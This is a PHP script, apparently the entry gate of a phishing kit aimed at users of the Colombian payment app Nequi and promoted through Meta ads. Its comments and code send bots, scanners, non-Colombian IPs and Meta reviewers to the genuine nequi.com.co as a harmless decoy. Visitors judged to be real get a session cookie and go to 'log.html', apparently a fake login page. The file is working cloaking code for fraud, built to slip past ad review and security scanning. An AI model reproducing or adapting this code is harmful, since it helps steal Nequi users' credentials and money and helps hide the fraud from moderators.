<?php
/**
 * simulador/index.php — Gate principal para Meta Ads
 *
 * Flujo:
 *  · Bot / scanner / IP datacenter / fuera de Colombia → decoy (nequi.com.co)
 *  · Click legítimo desde Meta (fbclid/igshid) → umbral más permisivo
 *  · Usuario real → cookie HMAC + redirect a log.html
 */
define('NQ_LOADED', true);
require __DIR__ . '/data.php';

// data.php ya bloqueó IPs fuera de Colombia.
// Aquí solo evaluamos el score de bot.

$has_meta_click = !empty($_GET['fbclid']) || !empty($_GET['igshid']);

// Umbral: 8 para tráfico general, 14 para clicks directos de Meta
// (Meta puede enviar algunos headers propios al primer crawl del enlace)
$threshold = $has_meta_click ? 14 : 8;

if ($_nq_score >= $threshold) {
    // Bot, scanner o revisor de Meta → mostrar decoy inofensivo
    header('Location: https://www.nequi.com.co/');
    exit;
}

// Usuario real → emitir cookie de sesión y redirigir al simulador
nq_set_gate_cookie();

// Cookie legible por JS (para verificación client-side en páginas HTML)
$_exp   = time() + NQ_TTL;
$_https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
       || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https');
setcookie('_nqs', '1', [
    'expires'  => $_exp,
    'path'     => '/',
    'secure'   => $_https,
    'httponly' => false,
    'samesite' => 'Lax',
]);

header('Location: log.html');
exit;
